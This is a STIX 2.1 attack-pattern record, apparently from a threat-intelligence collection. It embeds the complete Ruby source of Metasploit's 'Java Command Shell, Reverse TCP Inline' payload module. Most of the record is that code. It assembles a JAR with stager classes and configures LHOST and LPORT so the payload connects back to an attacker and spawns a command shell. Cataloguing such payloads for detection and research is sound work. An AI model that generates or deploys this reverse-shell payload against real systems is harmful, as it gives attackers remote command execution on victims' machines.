{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3298c706-11a0-4750-9c9f-ea4d9bbd27d5",
    "created": "2024-08-14T16:33:19.400189Z",
    "modified": "2024-08-14T16:33:19.400193Z",
    "name": "Java Command Shell, Reverse TCP Inline",
    "description": "Connect back to attacker and spawn a command shell",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/java/shell_reverse_tcp.rb",
            "external_id": "shell_reverse_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 7497\n\n  include Msf::Payload::Single\n  include Msf::Payload::Java\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info={})\n    super(merge_info(info,\n      'Name'        => 'Java Command Shell, Reverse TCP Inline',\n      'Description' => 'Connect back to attacker and spawn a command shell',\n      'Author'      => ['mihi', 'egypt'],\n      'License'     => MSF_LICENSE,\n      'Platform'    => ['java'],\n      'Arch'        => ARCH_JAVA,\n      'Handler'     => Msf::Handler::ReverseTcp,\n      'Session'     => Msf::Sessions::CommandShell,\n      'Payload'     => {'Offsets' => {}, 'Payload' => ''}\n      ))\n  end\n\n  def generate_jar(opts={})\n    jar = Rex::Zip::Jar.new\n    jar.add_sub(\"metasploit\") if opts[:random]\n    class_files.each do |path|\n      1.upto(path.length - 1) do |idx|\n        full = path[0,idx].join(\"/\") + \"/\"\n        if !(jar.entries.map{|e|e.name}.include?(full))\n          jar.add_file(full, '')\n        end\n      end\n      data = MetasploitPayloads.read('java', path)\n      jar.add_file(path.join(\"/\"), data)\n    end\n    jar.build_manifest(:main_class => \"metasploit.Payload\")\n    jar.add_file(\"metasploit.dat\", stager_config(opts))\n\n    jar\n  end\n\n  def stager_config(opts={})\n    ds = opts[:datastore] || datastore\n    c =  \"\"\n    c << \"LHOST=#{ds[\"LHOST\"]}\\n\" if ds[\"LHOST\"]\n    c << \"LPORT=#{ds[\"LPORT\"]}\\n\" if ds[\"LPORT\"]\n    # Magical, means use stdin/stdout.  Used for debugging\n    #c << \"LPORT=0\\n\"\n    c << \"EmbeddedStage=Shell\\n\"\n\n    c\n  end\n\n  def class_files\n    [\n      ['metasploit', 'Payload.class'],\n      ['javapayload', 'stage', 'Stage.class'],\n      ['javapayload', 'stage', 'StreamForwarder.class'],\n      ['javapayload', 'stage', 'Shell.class'],\n    ]\n  end\nend\n",
    "x_mitre_platforms": [
        "['java']"
    ]
}